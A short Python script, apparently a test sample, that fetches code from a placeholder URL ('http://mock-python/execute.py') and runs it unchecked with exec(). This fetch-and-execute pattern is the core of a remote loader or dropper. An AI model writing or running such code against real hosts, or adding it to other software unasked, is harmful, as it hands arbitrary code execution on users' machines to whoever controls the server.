import urllib.request
import importlib

def get_url():
    return "http://mock-python/execute.py"

def get_response(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def exec_code(src):
    try:
        exec(src)
    except Exception as e:
        print("Error occurred:", e)

def main():
    url = get_url()
    source = get_response(url)
    exec_code(source)

main()
